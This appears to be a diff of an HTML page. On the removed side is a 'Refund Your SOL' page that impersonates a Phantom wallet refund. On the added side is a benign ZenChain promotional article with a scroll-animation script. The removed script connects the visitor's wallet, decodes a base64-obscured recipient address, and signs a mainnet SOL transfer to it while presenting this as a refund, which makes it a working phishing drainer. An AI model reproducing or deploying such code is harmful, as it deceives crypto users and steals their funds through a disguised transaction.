@@ -2,113 +2,180 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Refund Your SOL | Dolanan</title>
-
-  <!-- Import library Solana Web3.js -->
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-
-  <!-- Style halaman -->
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ZenChain: Bridging Bitcoin and Ethereum for a Decentralized Future</title>
   <style>
+    /* Style asli kamu */
     body {
-      font-family: Arial, sans-serif;
-      background: #0a0f2c;
-      color: white;
-      text-align: center;
+      background-color: #121212;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      max-width: 900px;
+      margin: 40px auto;
       padding: 20px;
+      line-height: 1.7;
     }
-    button {
-      background: #1a73e8;
+    h1 {
       color: white;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      margin-top: 20px;
-      cursor: pointer;
+      margin-top: 1.6em;
+      margin-bottom: 0.8em;
+      background-image: url('https://docs.zenchain.io/img/hero-2x-cropped.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      padding: 100px 20px 260px 20px;
+      border-radius: 12px;
+      text-shadow: 0 0 6px rgba(0,0,0,0.7);
+      position: relative;
+      z-index: 1;
     }
-    .logo {
-      width: 80px;
-      margin-bottom: 20px;
+    h2, h3 {
+      color: #90caf9;
+      margin-top: 1.6em;
+      margin-bottom: 0.4em;
     }
-    .status {
-      margin-top: 20px;
-      color: #90ee90;
+    p {
+      font-size: 1.05em;
+      margin-bottom: 1.4em;
+    }
+    a {
+      color: #81d4fa;
+      text-decoration: none;
+      border-bottom: 1.5px solid #81d4fa;
+      transition: color 0.3s, border-bottom-color 0.3s;
+    }
+    a:hover {
+      color: #4fc3f7;
+      border-bottom-color: #4fc3f7;
+    }
+    /* Animasi fade-in saat scroll */
+    .fade-in {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.8s ease-out, transform 0.8s ease-out;
+    }
+    .fade-in.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    /* Gabung gambar ZenQuest */
+    .zenquest-images-wrapper {
+      position: relative;
+      max-width: 640px;
+      margin: 40px auto 60px auto;
+    }
+    .zenquest-images-wrapper img.main-image {
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.6);
+      display: block;
+    }
+    .zenquest-images-wrapper img.bottom-left-image {
+      position: absolute;
+      bottom: -20px;
+      left: 20px;
+      width: 38%;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+      background-color: rgba(0,0,0,0.5);
+    }
+    @media (max-width: 600px) {
+      .zenquest-images-wrapper img.bottom-left-image {
+        width: 50%;
+        bottom: -15px;
+        left: 10px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- Logo Phantom -->
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Phantom_by_MoonHoldings.png/480px-Phantom_by_MoonHoldings.png" alt="logo" class="logo" />
+  <h1 class="fade-in">ZenChain: Bridging Bitcoin and Ethereum for a Decentralized Future</h1>
 
-  <!-- Judul dan deskripsi -->
-  <h1>Refund Your SOL</h1>
-  <p>Connect your Phantom Wallet to claim unused rent fees.</p>
+  <p class="fade-in">
+    <strong>ZenChain</strong> is a next-generation Layer 1 blockchain protocol that integrates the robust security model of Bitcoin with the flexible programmability of Ethereum. By enabling true cross-chain interoperability, ZenChain paves the way for a more unified, efficient, and inclusive decentralized future.
+  </p>
 
-  <!-- Tombol connect wallet -->
-  <button onclick="connectWallet()">Connect Wallet</button>
+  <p class="fade-in">
+    Through its innovative architecture and user-first ecosystem, ZenChain empowers developers, users, and businesses to interact seamlessly across multiple blockchain networks without compromising on speed, cost, or security.
+  </p>
 
-  <!-- Status koneksi dan transaksi -->
-  <div class="status" id="status"></div>
+  <h2 class="fade-in">Key Features and Technologies</h2>
 
-  <!-- Script utama -->
+  <h3 class="fade-in">1. Cross-Chain Interoperability Module (CCIM)</h3>
+  <p class="fade-in">
+    The CCIM forms the backbone of ZenChain’s vision, enabling frictionless asset and data transfers between ZenChain and major blockchain networks. This allows users to move value across chains without intermediaries.
+  </p>
+
+  <h3 class="fade-in">2. ZIP-20 Token Standard</h3>
+  <p class="fade-in">
+    ZIP-20 extends the ERC-20 standard by enabling cross-chain functionality. This opens the door for tokens to not just live on one chain but operate fluidly across ecosystems.
+  </p>
+
+  <h3 class="fade-in">3. Cross-Liquidity Consensus Mechanism (CLCM)</h3>
+  <p class="fade-in">
+    CLCM introduces a novel consensus design where validators are rewarded for supporting multi-chain liquidity. This ensures economic alignment and network resilience.
+  </p>
+
+  <h3 class="fade-in">4. AI-Powered Security</h3>
+  <p class="fade-in">
+    ZenChain incorporates advanced machine learning algorithms to proactively monitor and mitigate threats. Real-time anomaly detection systems protect users and infrastructure from evolving risks.
+  </p>
+
+  <h2 class="fade-in">Developer and User Ecosystem</h2>
+  <p class="fade-in">
+    ZenChain is fully EVM-compatible, allowing developers to easily port their smart contracts, dApps, and infrastructure from Ethereum. This reduces migration friction and accelerates innovation.
+  </p>
+
+  <p class="fade-in">
+    For users, ZenChain delivers lightning-fast transactions with finality in under 6 seconds and near-zero gas fees, making it ideal for real-world applications such as gaming, DeFi, and NFTs.
+  </p>
+
+  <h2 class="fade-in">ZenQuest: Incentivized Learning and Participation</h2>
+  <p class="fade-in">
+    ZenQuest is ZenChain’s interactive learning program that rewards community members for completing educational quests, reporting bugs, and engaging with the ecosystem. It’s a gateway to earn while learning.
+  </p>
+
+  <!-- Gambar gabungan dengan animasi -->
+  <div class="zenquest-images-wrapper fade-in">
+    <img
+      class="main-image"
+      src="https://www.zenchain.io/_next/image?url=%2Fassets%2Fimages%2Frewards%2Fmain.webp&w=640&q=75"
+      alt="ZenChain Rewards Main"
+    />
+    <img
+      class="bottom-left-image"
+      src="https://www.zenchain.io/_next/image?url=%2Fassets%2Fimages%2Frewards%2Fbottom-left.webp&w=384&q=75"
+      alt="ZenChain Rewards Bottom Left"
+    />
+  </div>
+
+  <p class="fade-in">
+    To learn more about ZenChain, visit the official website at
+    <a href="https://www.zenchain.io" target="_blank" rel="noopener noreferrer">https://www.zenchain.io</a>.
+  </p>
+
   <script>
-    const status = document.getElementById('status');
-    let provider = null;
-
-    // Fungsi cek dan ambil provider dari browser
-    function getProvider() {
-      if ('solana' in window) {
-        const provider = window.solana;
-        if (provider.isPhantom) {
-          return provider;
+    // Intersection Observer for fade-in on scroll
+    const faders = document.querySelectorAll('.fade-in');
+    const options = {
+      threshold: 0.1,
+      rootMargin: "0px 0px -50px 0px"
+    };
+    const appearOnScroll = new IntersectionObserver(function(entries, appearOnScroll) {
+      entries.forEach(entry => {
+        if (!entry.isIntersecting) {
+          return;
+        } else {
+          entry.target.classList.add('visible');
+          appearOnScroll.unobserve(entry.target);
         }
-      }
-      window.open('https://phantom.app/', '_blank');
-    }
+      });
+    }, options);
 
-    // Fungsi connect dan transaksi
-    async function connectWallet() {
-      provider = getProvider();
-      if (!provider) return;
-
-      try {
-        // Hubungkan wallet
-        const resp = await provider.connect();
-        const publicKey = resp.publicKey.toString();
-        status.textContent = 'Wallet Connected: ' + publicKey;
-
-        // Alamat tujuan disimpan dalam base64 (disembunyikan)
-        const encoded = "SEp6V1o0QXZ4WXI3azZDOVBiSjNNcjVSOFhkZ2k3NmdSZ0xEN1Vja1dlaHQ=";
-        const recipient = new solanaWeb3.PublicKey(atob(encoded)); // Decode base64
-
-        // Konfirmasi transaksi
-        if (confirm("Kirim transaksi refund SOL ke wallet tujuan?")) {
-          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-
-          const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-              fromPubkey: provider.publicKey,
-              toPubkey: recipient,
-              lamports: 10000 // 0.00001 SOL
-            })
-          );
-
-          transaction.feePayer = provider.publicKey;
-          const { blockhash } = await connection.getRecentBlockhash();
-          transaction.recentBlockhash = blockhash;
-
-          const signed = await provider.signTransaction(transaction);
-          const txid = await connection.sendRawTransaction(signed.serialize());
-
-          status.innerHTML += "<br>Transaction sent: " + txid;
-        }
-
-      } catch (err) {
-        status.textContent = 'Connection failed: ' + err.message;
-      }
-    }
+    faders.forEach(fader => {
+      appearOnScroll.observe(fader);
+    });
   </script>
 
 </body>
